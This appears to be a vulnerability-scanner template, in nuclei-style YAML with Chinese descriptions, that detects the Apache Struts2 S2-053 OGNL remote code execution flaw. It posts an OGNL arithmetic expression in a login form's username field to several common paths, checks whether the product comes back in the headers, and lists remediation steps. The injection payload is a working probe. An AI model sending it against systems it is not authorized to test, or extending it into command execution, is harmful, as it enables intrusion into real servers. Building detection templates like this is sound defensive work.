id: S2-053
info:
  name: Apache Struts2 S2-053 - Remote Code Execution
  author:
  - 折跃
  description: |-
    Struts2 S2-053 远程命令执行
    Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
  severity: critical
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁

    #### 临时修复方案
    1. Freemarker标签内容不要通过Request方式获取
    2. 使用只读属性来初始化value属性（仅限getter属性），不要使用如下结构
    ```
    <@s.hidden name=”redirectUri” value=redirectUri />
    ```
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==200
    - contains(all_headers,to_string(to_number(verify)*to_number(3)))
  path:
  - '{{BaseURL}}{{tmpPath}}'
  attack: clusterbomb
  method: POST
  body: |
    username=%25%7B{{verify}}%2a3%7D&password=123456
  payloads:
    tmpPath:
    - /
    - /index.action
    - /login.action
    - /default.action
    - /admin.action
    - /user.action
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: true
  req-condition: true
  stop-at-first-match: true
variables:
  verify: '{{rand_int(10000,20000)}}'
